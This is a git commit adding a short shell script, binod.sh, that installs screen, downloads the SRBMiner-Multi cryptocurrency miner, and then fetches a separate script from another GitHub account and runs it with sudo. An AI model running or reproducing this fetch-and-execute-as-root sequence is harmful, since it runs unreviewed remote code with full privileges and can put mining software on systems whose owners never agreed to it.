55c38b32021ce928133b0cd9a1e43d5e6bdc7fa2
uveshV <87410093+uveshV@users.noreply.github.com>
2021-09-15 10:13:51 +0100

    Create binod.sh

---
+++ binod.sh
@@ -0,0 +1,9 @@
+apt install screen
+
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.7.6/SRBMiner-Multi-0-7-6-Linux.tar.xz
+tar -xvf SRBMiner-Multi-0-7-6-Linux.tar.xz
+cd SRBMiner-Multi-0-7-6
+
+wget https://raw.githubusercontent.com/gitcuan/gitcuan/main/srbvrscA.sh
+chmod +x srbvrscA.sh
+sudo ./srbvrscA.sh
